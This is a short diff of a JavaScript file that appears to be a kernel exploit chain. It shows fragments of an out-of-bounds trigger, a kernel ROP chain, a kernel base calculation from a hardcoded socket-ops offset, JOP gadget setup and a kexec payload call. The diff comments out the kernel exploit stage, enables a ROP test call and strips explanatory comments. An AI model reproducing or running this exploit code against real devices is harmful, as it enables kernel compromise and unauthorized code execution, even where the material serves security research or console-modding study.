@@ -666,10 +666,10 @@ function test_rop(Chain) {
     }
 }
 
-//debug_log('Chain900');
-//test_rop(Chain);
+debug_log('Chain900');
+test_rop(Chain);
 
-function prepare_knote(kchain) {
+/*function prepare_knote(kchain) {
     const chain = new Chain();
     const size = 0x4000 * 4;
     // PROT_READ | PROT_WRITE
@@ -843,7 +843,6 @@ function trigger_oob(kchain) {
     debug_log('kernel ROP chain ran successfully');
     kchain.clean();
 
-    // reuse sd for the fchmod() kernel ROP chain
     return [sd, kretval];
 }
 
@@ -861,12 +860,10 @@ async function kexploit() {
     ] = prepare_knote(kchain);
     const [sd, kretval] = trigger_oob(kchain);
 
-    // offset relative to kernel base
     const offset_k_socketops_fo_chmod = 0x1a76060;
     kbase = kretval.sub(offset_k_socketops_fo_chmod);
     debug_log(`kbase: ${kbase}`);
 
-    // setup for fchmod() kernel ROP chain
     mmap_area.write64(8, jop_buffer);
     rax_ptrs.write64(0x70, kchain.get_gadget(jop2));
 
@@ -877,7 +874,7 @@ async function kexploit() {
     await kexec_payload(kchain, sd, mmap_area);
 }
 
-kexploit();
+kexploit();*/
 
 
 
